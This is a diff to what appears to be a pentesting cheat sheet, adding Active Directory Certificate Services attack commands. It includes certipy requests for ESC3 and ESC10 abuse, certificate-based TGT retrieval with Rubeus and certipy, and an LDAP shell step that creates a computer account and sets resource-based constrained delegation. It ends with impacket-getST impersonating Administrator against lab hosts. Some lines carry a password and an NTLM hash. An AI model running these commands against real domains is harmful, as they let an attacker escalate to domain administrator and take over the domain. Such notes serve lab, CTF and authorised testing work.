@@ -1794,13 +1794,29 @@ Cryptographic Provider v1.0" -export -out admin.pfx
 ### docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
 certipy find -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes aaaaaaaaa -vulnerable -stdout
 # ntpdate dc-ip
-certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
+certipy req -u 'user' -p Password -ca CA_Name -dc-ip DCIP -template TempName -upn
 'Administrator@example.com' -debug
 
-# TGT request
-.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
+## ESC 3
+certipy req -u 'own_user' -p 'Password' -ca CA_Name -template User -on-behalf-of 'lab\administrator' -pfx own_user.pfx -dc-ip 10.129.228.236
 
+# TGT request
+## Rubeus
+.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
+## certipy
 certipy auth -pfx administrator.pfx -dc-ip <dc-ip> -debug
+
+
+# ESC 10
+certipy account update -u 'user' -p 'Password' -user own_user -upn 'lab-dc$@lab.local' -dc-ip 10.129.228.236
+certipy req -u 'own_user' -hashes ee22ddf0f8a66db4217050e6a948f9d6 -ca CA_Name -template User -dc-ip 10.129.228.236
+certipy account update -u 'user' -p 'Password' -user own_user -upn 'user2@lab.local' -dc-ip 10.129.228.236
+## ldap_shell for RBCD
+certipy auth -pfx lab-dc.pfx -dc-ip 10.129.228.236 -ldap-shell
+add_computer plaintext plaintext123
+set_rbcd lab-dc$ plaintext$
+## RBCD
+impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.228.236 lab.local/'plaintext$':plaintext123
 ```
 #### PassTheCert
 ```powershell
